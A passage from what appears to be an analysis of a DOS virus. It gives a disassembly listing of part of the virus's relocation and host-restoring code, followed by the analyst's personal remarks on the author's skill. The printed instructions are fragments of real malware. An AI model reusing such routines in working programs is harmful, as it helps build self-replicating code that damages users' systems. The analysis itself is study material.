1CF5:2CB1 8ED8          MOV	DS,AX                 
1CF5:2CB3 BE0301        MOV	SI,0103               
1CF5:2CB6 BF0001        MOV	DI,0100               
1CF5:2CB9 B90400        MOV	CX,0004               
1CF5:2CBC F3            REPZ	                      
1CF5:2CBD A4            MOVSB	                      
1CF5:2CBE 2E            CS:	                      
1CF5:2CBF C70608010001  MOV	WORD PTR [0108],0100  
1CF5:2CC5 2E            CS:	                      
1CF5:2CC6 8C060A01      MOV	[010A],ES             
1CF5:2CCA E99EFE        JMP	2B6B                  
1CF5:2CCD 8EC2          MOV	ES,DX                 
1CF5:2CCF BE0000        MOV	SI,0000               
1CF5:2CD2 BF0000        MOV	DI,0000               
1CF5:2CD5 8BCB          MOV	CX,BX                 
1CF5:2CD7 F3            REPZ	                      
1CF5:2CD8 A4            MOVSB	                      
1CF5:2CD9 8CCF          MOV	DI,CS                 
1CF5:2CDB 8EC7          MOV	ES,DI                 
1CF5:2CDD BF0001        MOV	DI,0100               
1CF5:2CE0 8BF3          MOV	SI,BX                 
1CF5:2CE2 B9C40A        MOV	CX,0AC4               
1CF5:2CE5 F3            REPZ	                      
1CF5:2CE6 A4            MOVSB	                      
1CF5:2CE7 B8690B        MOV	AX,0B69               
1CF5:2CEA FFE0          JMP	AX                    
1CF5:2CEC B80D00        MOV	AX,000D               
1CF5:2CEF 50            PUSH	AX                    
1CF5:2CF0 B80500        MOV	AX,0005               
1CF5:2CF3 50            PUSH	AX                    
1CF5:2CF4 E83409        CALL	362B                  

-i would like to give final conclusions about the virus, which are my private
intentionally feeling:

the author of the virus seems to be one, who knows a lot about the 8088 
processor. he (or she, who knows ?) seems to be someone familiar with the
concepts of the c programming language. by looking through the code, i 
believe that he is not very familiar with the assembler itself. lots of
instructions could be more elegant. the computation of some constant values
could be left to the assembler, if he wold know the more advanced operators.


